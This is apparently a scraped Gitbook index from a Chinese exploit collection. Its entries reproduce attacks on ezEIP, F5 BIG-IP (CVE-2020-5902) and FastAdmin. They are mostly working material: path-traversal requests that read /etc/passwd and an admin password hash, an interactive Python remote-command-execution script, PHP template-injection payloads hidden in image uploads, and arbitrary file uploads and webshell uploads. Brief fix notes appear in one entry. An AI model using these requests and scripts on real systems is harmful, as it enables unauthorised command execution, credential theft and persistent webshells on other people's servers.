生成webshell。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:13 "},"Web安全/ezEIP/ezEIP 4.1.0 信息泄露漏洞/ezEIP 4.1.0 信息泄露漏洞.html":{"url":"Web安全/ezEIP/ezEIP 4.1.0 信息泄露漏洞/ezEIP 4.1.0 信息泄露漏洞.html","title":"ezEIP 4.1.0 信息泄露漏洞","keywords":"","body":"ezEIP 4.1.0 信息泄露漏洞 漏洞描述 ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息 漏洞影响 ezEIP 4.1.0 FOFA \"ezEIP\" 漏洞复现 漏洞Url为 /label/member/getinfo.aspx 访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息） WHIR_USERINFOR=whir_mem_member_pid=1; [ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:23 "},"Web安全/F5 BIG-IP/（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞/（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞.html":{"url":"Web安全/F5 BIG-IP/（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞/（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞.html","title":"（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞","keywords":"","body":"（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞 一、漏洞简介 本次漏洞位于F5 BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。 二、漏洞影响 BIG-IP 15.x: 15.1.0/15.0.0BIG-IP 14.x: 14.1.0 ~ 14.1.2BIG-IP 13.x: 13.1.0 ~ 13.1.3BIG-IP 12.x: 12.1.0 ~ 12.1.5BIG-IP 11.x: 11.6.1 ~ 11.6.5 三、复现过程 列当前文件 /tmui/locallb/workspace/directoryList.jsp Example: directoryPath=/usr/local/www/ 1.png BurpSuite Request GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50 Connection: close Upgrade-Insecure-Requests: 1 BurpSuite Response { \"dir\": \"tmui\", \"children\": [ { \"dir\": \"WEB-INF\", \"children\": [ { \"dir\": \"classes\", \"children\": [ { \"dir\": \"org\", \"children\": [ { \"dir\": \"apache\", \"children\": [ { \"dir\": \"jsp\", \"children\": [ { \"dir\": \"common\", \"children\": [ { \"file\": \"deleteconfirm_jsp.class\" ............................ 读取当前文件 Example: /tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd 2.png BurpSuite Requests GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 BurpSuite Response { \"output\": \"root:x:0:0:root:/root:/bin/bash\\nbin:x:1:1:bin:/bin:/sbin/nologin\\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\\nadm:x:3:4:adm:/var/adm:/sbin/nologin\\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\\noperator:x:11:0:operator:/root:/sbin/nologin\\nnobody:x:99:99:Nobody:/:/sbin/nologin\\ntmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin\\nadmin:x:0:500:Admin User:/home/admin:/sbin/nologin\\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\\ndbus:x:81:81:System message bus:/:/sbin/nologin\\npostgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin\\nf5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin\\noprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin\\ntcpdump:x:72:72::/:/sbin/nologin\\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\\nhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin\\napache:x:48:48:Apache:/usr/local/www:/sbin/nologin\\ntomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin\\nmysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin\\nnamed:x:25:25:Named:/var/named:/bin/false\\nqemu:x:107:107:qemu user:/:/sbin/nologin\\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\\nsdm:x:498:495:sdmuser:/var/sdm:/bin/false\\nntp:x:38:38::/etc/ntp:/sbin/nologin\\nsyscheck:x:199:10::/:/sbin/nologin\\nrestnoded:x:198:198::/:/sbin/nologin\\ntwister5:x:0:500:twister5:/home/twister5:/bin/bash\\n\" } format root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin admin:x:0:500:Admin User:/home/admin:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin postgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin apache:x:48:48:Apache:/usr/local/www:/sbin/nologin tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin mysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin named:x:25:25:Named:/var/named:/bin/false qemu:x:107:107:qemu user:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin sdm:x:498:495:sdmuser:/var/sdm:/bin/false ntp:x:38:38::/etc/ntp:/sbin/nologin syscheck:x:199:10::/:/sbin/nologin restnoded:x:198:198::/:/sbin/nologin twister5:x:0:500:twister5:/home/twister5:/bin/bash 远程命令执行 Example: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin list auth user look all user list auth user admin only look admin user https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions3.png GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 { \"error\": \"\", \"output\": \"auth user admin {\\n description \\\"Admin User\\\"\\n encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1\\n partition Common\\n partition-access {\\n all-partitions {\\n role admin\\n }\\n }\\n shell tmsh\\n}\\n\" } format description \"Admin User\" encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1 partition Common partition-access { all-partitions { role admin } } shell tmsh } WorkspaceUtils.runTmshCommand JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request); /usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand public static JSONObject runTmshCommand(String command, HttpServletRequest request) { F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class); JSONObject resultObject = new JSONObject(); String output = \"\"; String error = \"\"; if (!csrfValidated(request.getHeader(\"_bufvalue\"), request.getHeader(\"_timenow\"), request.getHeader(\"Tmui-Dubbuf\"))) { logger.warn(\"Invalid user token - token provided by user is not authorized\"); resultObject.put(\"output\", output); resultObject.put(\"error\", NLSEngine.getString(\"ilx.workspace.error.InvalidUserToken\")); return resultObject; } if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = { command }; Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (com.f5.tmui.util.Syscall.CallException e) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + e.getMessage()); error = e.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } } else { error = NLSEngine.getString(\"ilx.workspace.error.InvalidMethod\"); } resultObject.put(\"output\", output); resultObject.put(\"error\", error); return resultObject; } 文件上传 Example: /tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/1.txt&content=CVE-2020-5902 4.png Burpsuite Requests POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 41 fileName=/tmp/1.txt&content=CVE-2020-5902 HTTP/1.1 200 OK Date: Mon, 06 Jul 2020 02:05:29 GMT X-Frame-Options: SAMEORIGIN Strict-Transport-Security: max-age=16070400; includeSubDomains Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly Content-Type: text/html;charset=ISO-8859-1 X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: http://127.4.1.1 http://127.4.2.1 Vary: Accept-Encoding Content-Length: 4 Connection: close File Read /tmp/1.txt 5.png GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Mon, 06 Jul 2020 02:06:07 GMT X-Frame-Options: SAMEORIGIN Strict-Transport-Security: max-age=16070400; includeSubDomains Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly Content-Type: text/html;charset=ISO-8859-1 X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: http://127.4.1.1 http://127.4.2.1 Vary: Accept-Encoding Content-Length: 32 Connection: close {\"output\":\"CVE-2020-5902\\n\"} upload /tmp/1.txt Successful ！ poc 6.png #coding:utf-8 import requests import json import requests.packages.urllib3 requests.packages.urllib3.disable_warnings() import uuid import sys # tmshCmd.jsp?command=create+cli+alias+private+list+command+bash # fileSave.jsp?fileName=/tmp/cmd&content=id # tmshCmd.jsp?command=list+/tmp/cmd # tmshCmd.jsp?command=delete+cli+alias+private+list banner = r''' _______ _______ ______ _________ _______ _________ _______ _______ _______ _______ ( ____ \\( ____ \\ ( ___ \\ \\__ __/( ____ \\ \\__ __/( ____ ) ( ____ )( ____ \\( ____ | ( \\/| ( \\/ | ( ) ) ) ( | ( \\/ ) ( | ( )| | ( )|| ( \\/| ( \\/ | (__ | (____ | (__/ / | | | | | | | (____)| | (____)|| | | (__ | __) (_____ \\ | __ ( | | | | ____ | | | _____) | __)| | | __) | ( ) ) | ( \\ \\ | | | | \\_ ) | | | ( | (\\ ( | | | ( | ) /\\____) ) | )___) )___) (___| (___) | ___) (___| ) | ) \\ \\__| (____/\\| (____/ |/ \\______/ |/ \\___/ \\_______/(_______) \\_______/|/ |/ \\__/(_______/(_______/ CVE-2020-5902 UnAuth RCE Vuln Python By Jas502n From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb ____________________________________________________________________________________________________________________________________________________ ''' def tmshCmd_exit(url,file,cmd): tmshCmd_url = url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash\" proxies = {\"http\":\"http://127.0.0.1:8080\",\"https\":\"https://127.0.0.1:8080\"} r = requests.get(tmshCmd_url,verify=False,allow_redirects=False) # r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies) response_str = json.dumps(r.headers.__dict__['_store']) # print type(response_str) # print response_str if r.status_code == 200 and 'tmui' in response_str: # print tmshCmd_url print \"[+] tmshCmd.jsp Exit!\" print \"[+] create cli alias private list command bash \\n\" # cmd = 'whoami' upload_exit(url,file,cmd) else: print \"[+] tmshCmd.jsp No Exit!\\n\" def upload_exit(url,file,cmd): fileSave_url = url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&content=\"%file + cmd proxies = {\"http\":\"http://127.0.0.1:8080\",\"https\":\"https://127.0.0.1:8080\"} r = requests.get(fileSave_url,verify=False,allow_redirects=False) # r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies) response_str = json.dumps(r.headers.__dict__['_store']) if r.status_code == 200 and 'tmui' in response_str: # print fileSave_url print \"[+] fileSave.jsp Exit!\\n\" list_command(url,file) else: print \"[+] fileSave.jsp No Exit!\\n\" def list_command(url,file): rce_url = url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s\" % file proxies = {\"http\":\"http://127.0.0.1:8080\",\"https\":\"https://127.0.0.1:8080\"} r = requests.get(rce_url,verify=False,allow_redirects=False) # r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies) response_str = json.dumps(r.headers.__dict__['_store']) # print len(r.content) if r.status_code == 200 and 'tmui' in response_str: if len(r.content) > 33: # print rce_url print \"[+] Command Successfull !\\n\" command_result = json.loads(r.content) print \"_\"*90,'\\n\\n' print command_result['output'] print \"_\"*90,\"\\n\\n\" delete_list(url) else: print \"[+] Command Failed !\\n\" def delete_list(url): delete_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list' proxies = {\"http\":\"http://127.0.0.1:8080\",\"https\":\"https://127.0.0.1:8080\"} r = requests.get(delete_url,verify=False,allow_redirects=False) # r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies) response_str = json.dumps(r.headers.__dict__['_store']) if r.status_code == 200 and 'tmui' in response_str: # print delete_url print \"[+] delete cli alias private list Successfull! \\n\" else: print \"[+] delete cli alias private list Failed! \\n\" if __name__ == '__main__': print banner while 1: url = \"https://x.x.x.x/\" # url = sys.argv[1] file = str(uuid.uuid1()) print \"/tmp/\" + file,\"\\n\" cmd = raw_input(\"[+]Set Cmd= \") print tmshCmd_exit(url,file,cmd) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:25 "},"Web安全/FastAdmin/FastAdmin 会员中心前台getshell/FastAdmin 会员中心前台getshell.html":{"url":"Web安全/FastAdmin/FastAdmin 会员中心前台getshell/FastAdmin 会员中心前台getshell.html","title":"FastAdmin 会员中心前台getshell","keywords":"","body":"FastAdmin 会员中心前台getshell 一、漏洞简介 利用条件 /application/config.php 文件中： //是否开启前台会员中心 'usercenter' => true, 即需要开启会员中心功能 二、漏洞影响 V1.0.0.20200506_beta 三、复现过程 漏洞分析 /application/index/User.php文件 第58-67行： public function _empty($name) { $data = Hook::listen(\"user_request_empty\", $name); foreach ($data as $index => $datum) { $this->view->assign($datum); } return $this->view->fetch($name); } user_request_empty`为开发者预留的钩子可以忽视不看，主要看` return $this->view->fetch($name); 此方法中的$name参数可控，并且将$name的值传入到了fecth()函数中。 fetch()为thinkphp的解析模板函数，其返回模板文件渲染后的内容 fetch()函数的关键内容如下： public function fetch($template, $data = [], $config = []) { if ('' == pathinfo($template, PATHINFO_EXTENSION)) { // 获取模板文件名 $template = $this->parseTemplate($template); } // 模板不存在 抛出异常 if (!is_file($template)) { throw new TemplateNotFoundException('template not exists:' . $template, $template); } // 记录视图信息 App::$debug && Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info'); $this->template->fetch($template, $data, $config); } 继续调用栈可以看下其实这个fetch()函数调用的是内置模板引擎的fetch方法， 这个方法实际上就是将要输出的页面内容赋值给一个变量，为了方便，thinkphp在对模板渲染的过程中，添加了php标签功能，使得其可以解析php代码。 总之一句话，这个漏洞其实就是由于对传入变量过滤不严导致的模板引擎注入漏洞，只要控制了传入模板的文件，就可以利用模板本身的渲染功能，实现包含漏洞getshell 另外需要注意的是，当验证传入的模板是否是文件时，使用的is_file()函数，这个函数在Linux下和windows下的判断会有所不同，具体如下： 1、在linux下利用is_file()来判断类似于/****/../../../../etc/passwd文件时，如果****是不存在的目录，则会返回false，在windows下 ，这个目录存在与否，均返回true，如下图所示： 2、在linux下，is_file()函数判可用于判断符号链接 3、在linux下，is_file函数会受到权限的影响，当前用户权限不足或父目录没有设置+x权限时，is_file()会返回false 4、windows系统里面/和\\ 都可以使用，但是在linux下只能使用/ 来分隔路径，因此这会导致is_file()在不同系统下的返回结果不一致 5、is_file()判断文件时，如果文件大小超过2\\^32时，会判断失败 漏洞复现 通过前文可知，这个漏洞的利用点在_empty()函数，需要注意的是，在官方文档中通常_empty()方法是用来判断一个方法是否存在，如果不存在，则进入该函数。而这里是开发者自定义的方法，因此直接传入_empty方法，调用name参数即可。 利用过程如下： 在前台的会员中心，个人资料处，上传修改头像： 抓包后修改图片数据（满足图片头格式即可）： POST /index/ajax/upload HTTP/1.1 Host:www.0-sec.org:8088 Content-Length: 596 Origin: http://122.114.216.233 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ60Dcmopu4qDLQwq Accept: */* Referer: http://103.40.247.24/index/user/profile.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1600651554; PHPSESSID=e42uhkmhirv29cpd82qbubigd7; uid=3; token=251be91c-040b-4231-b955-76c3ecfaf4f4; Hm_lpvt_f8d0a8c400404989e195270b0bbf060a=1600651809 Connection: close ------WebKitFormBoundaryJ60Dcmopu4qDLQwq Content-Disposition: form-data; name=\"name\" 400x400a0a0.jpg ------WebKitFormBoundaryJ60Dcmopu4qDLQwq Content-Disposition: form-data; name=\"file\"; filename=\"400x400a0a0.jpg\" Content-Type: image/jpeg ÿØÿà8Photoshop 3.08BIM8BIM%\" {php}phpinfo();{/php} ------WebKitFormBoundaryJ60Dcmopu4qDLQwq-- 记录下路径后，成功getshell 在Linux下，通过这种方法会失效，因为在/public路径下不存在user目录，由前文中的知识点可以知道，当不存在这个目录的时候，无论怎么跳转目录，is_file()函数返回的结果始终未false，因此无法利用该漏洞，如下图所示： 当我们在/public目录下创建文件夹/user，在利用，即可成功： 参考链接 https://www.cnpanda.net/codeaudit/777.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:26 "},"Web安全/FastAdmin/FastAdmin 前台分片传输任意文件上传漏洞/FastAdmin 前台分片传输任意文件上传漏洞.html":{"url":"Web安全/FastAdmin/FastAdmin 前台分片传输任意文件上传漏洞/FastAdmin 前台分片传输任意文件上传漏洞.html","title":"FastAdmin 前台分片传输任意文件上传漏洞","keywords":"","body":"FastAdmin 前台分片传输任意文件上传漏洞 简介 FastAdmin 是一款基于 ThinkPHP 5 + Bootstrap 的极速后台开发框架。致力于服务开发者,快速搭建自己属于自己的后台。 漏洞概述 2021年3月28日，360漏洞云漏洞研究员发现，FastAdmin框架存在有条件RCE漏洞，由于FastAdmin的前台文件上传功能中提供了分片传输功能, 但在合并分片文件时因对文件路径的拼接处理不当导致可上传任意文件。 影响版本 FastAdmin 环境搭建 在官网上下载fastadmin，利用phpstudy搭建环境 https://package.fastadmin.net/full/1.2.0.20210125_full.zip 先开启分片上传功能，文件位置如下图 访问/public/install.php进行安装，填写数据无脑下一步即可 漏洞复现 漏洞需要一个低权限的账号,所以我们需要在前台注册一个普通用户 登陆后在个人资料头像处抓包并上传dog.jpg 更改上传数据包（需要注意图中几处红框的内容） POST /index/ajax/upload HTTP/1.1 Host: test.test Content-Length: 418 Accept: application/json Cache-Control: no-cache X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryurpjX18wIurjSyEp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=rn1k8an9su59qb7ghosafer4vg; think_var=zh-cn; uid=2; token=aad3aa1e-1c65-4ee4-989a-bb3a82a4dd4a Connection: close ------WebKitFormBoundaryurpjX18wIurjSyEp Content-Disposition: form-data; name=\"file\"; filename=\"dog.jpg\" Content-Type: application/octet-stream ------WebKitFormBoundaryurpjX18wIurjSyEp Content-Disposition: form-data; name=\"chunkid\"; test.php ------WebKitFormBoundaryurpjX18wIurjSyEp Content-Disposition: form-data; name=\"chunkindex\"; 0 ------WebKitFormBoundaryurpjX18wIurjSyEp-- 上传成功之后，会在网站路径 C:\\phpstudy_pro\\WWW\\fastadmin\\runtime\\chunks下生成一个test.php-0.part文件 发送数据包（需要注意图中几处红框的内容） 返回包显示200则代表合并成功 POST /index/ajax/upload HTTP/1.1 Host: tets.test Content-Length: 42 Accept: application/json Cache-Control: no-cache X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=mm4ejed8h7hubqq1stmogrut20; think_var=zh-cn; uid=2; token=f5a57bef-2ad2-496a-a4bc-66974bcc4a08 Connection: close chunkid=test.php&chunkcount=1&action=merge 发包后访问 /fastadmin/runtime/chunks/test.php （漏洞利用存在很大的局限性，首先是需要开启支持分片传输，我在调试的过程中发现，在指定 host 解析，设定网站的根目录为 /fastadmin/public 之后就无法访问 /fastadmin/runtime/chunks 下的文件，虽说如此，但是可以通过设定chunkid的值为 ../xxx.php 就可以实现跨目录的上传） 漏洞分析 根据漏洞描述需要开启支持分片上传，所以我们修改 application/extra/upload.php中chunking为 true 同时最新版本已经修复存在的漏洞，修复位置为 application/common/library/Upload.php 复现漏洞时，应注释这个部分 根据上传时的路由信息 /index.php/index/ajax/upload 定位至代码位置 application/index/controller/Ajax.php 漏洞的触发共分为两个过程，上传分片与合并分片 首先关注上传分片的过程 传入参数 chunckid 才会到上传分片的位置 \\app\\api\\controller\\Common::upload \\app\\common\\library\\Upload::chunk 在 chunk 方法中，首先对 Content-Type 进行了校验，必须为 application/octet-stream 将传入的参数 chunckid 与 chunckindex 通过 - 连接，最后拼接 .part 最后保存到 /runtime/chunks/ 当我们传递的 $chunkid 为 test.php , $chunckindex 为 0 时(参数选择为0，还有别的原因，下表)，最后拼接出的分片文件名为test.php-0.part 然后是合并分片文件的操作，需要传入参数 action=merge 才会到合并分片文件的函数 \\app\\common\\library\\Upload::merge 在 merge 方法中会将 $chunkid 的值指定为最后保存的文件名，然后回根据传入的参数$chunkcount遍历查找是否分片文件上传完成，我们仅上传了一个分片文件，所以第一个分片文件应该设定为0，此处 chunkcount 的值应为1 之后就将分片传输的文件写入指定的文件中，最后返回文件信息，即使最后报错提示是不允许的上传类型，但是文件已经保存到 /runtime/chunks/ 路径下 在上传对文件名进行校验的情况下，利用分片传输的中最后重命名文件名的特点，绕过对文件名的校验，实现了任意文件上传 修复方式 1、关闭分片传输 修改application/extra/upload.php中 chunking 为 false 2、升级FastAdmin版本，其中对 chunkid 做正则判断 参考链接 https://xz.aliyun.com/t/9395 https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg https://mp.weixin.qq.com/s/gAerDNnDSl6864oyvDy4nA Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:34 "},"Web安全/FastAdmin/FastAdmin 后台 auth_rule 权限认证getshell/FastAdmin 后台 auth_rule 权限认证getshell.html":{"url":"Web安全/FastAdmin/FastAdmin 后台 auth_rule 权限认证getshell/FastAdmin 后台 auth_rule 权限认证getshell.html","title":"FastAdmin 后台 auth_rule 权限认证getshell","keywords":"","body":"FastAdmin 后台 auth_rule 权限认证getshell 一、漏洞简介 fastadmin对超管开放修改auth_rule表的权限，造成权限认证时，能触发代码执行 二、漏洞影响 三、复现过程 首先，需要超管权限进入后台，选择权限管理，进入菜单规则 这里选择菜单规则，修改他的规则条件 保存，然后退出登录，选择一个低权限的用户登录 TP3的代码移植到了TP5，: ) 参考链接 https://www.zhihuifly.com/t/topic/672 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:38 "},"Web安全/FastAdmin/FastAdmin 第三方插件后台getshell/FastAdmin 第三方插件后台getshell.html":{"url":"Web安全/FastAdmin/FastAdmin 第三方插件后台getshell/FastAdmin 第三方插件后台getshell.html","title":"FastAdmin 第三方插件后台getshell","keywords":"","body":"FastAdmin 第三方插件后台getshell 0x01 前言 FastAdmin是基于ThinkPHP5和Bootstrap的后台框架，可以利用三方插件GetShell 0x02 本地测试 FastAdmin官方源码下载地址： https://www.fastadmin.net/download.html 开启phpstudy本地搭建 安装成功，新版源码的后台地址是随机生成的 后台默认会有插件管理功能，但是绝大部分用户会把这个功能阉割掉 点进去看到有一堆付费和免费的插件 翻到了目前已有的三个官方发布的在线文件管理器插件，一个是官方付费版，一个是三方付费版 但是由于舍不得花十块钱买插件，所有只能用三方免费版插件，直接点击安装会需要登录账号，登录信息会记录到日志，不便于操作，所以去官方下载离线安装包 Fileix文件管理器离线安装包官方下载地址： https://www.fastadmin.net/store/fileix.html 点击离线安装，选择上传你下载的ZIP离线安装包 插件安装完成会自动启用，默认路径配置是这样的 然后打开是这样的 可以修改为 ../../，那么再打开就是这样的 然后浅显易懂，直接右键上传php文件就能getshell 上面是本地测试环境，真实环境会出现这样一个问题，就是点击文件管理功能不会显示任何内容 后来了解一下是因为没有配置前台页面，不太好修改，所以利用下面的方法 0x03 通用方法 1.插件管理地址： /admin/addon?ref=addtabs 进入后台默认不显示插件管理功能，访问插件管理地址，上传离线安装包 2.文件管理地址/读取所有文件地址： /admin/fileix?ref=addtabs/admin/fileix/lst 真实环境中如果出现不显示功能的情况，必要时可以读取所有文件地址 3.上传poc： POST /admin/fileix/data?target=%2F HTTP/1.1 Host: localhost Content-Length: 1050 Origin: http://localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrZmyeAB3SciJDWST Accept: */* Referer: http://localhost Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8 Cookie: PHPSESSID=xxxxxxxx Connection: close ------WebKitFormBoundaryrZmyeAB3SciJDWST Content-Disposition: form-data; name=\"upload\"; filename=\"shell.php\" Content-Type: application/octet-stream code ------WebKitFormBoundaryrZmyeAB3SciJDWST Content-Disposition: form-data; name=\"action\" upload ------WebKitFormBoundaryrZmyeAB3SciJDWST Content-Disposition: form-data; name=\"target\" /public/ ------WebKitFormBoundaryrZmyeAB3SciJDWST-- 修改host地址post过去 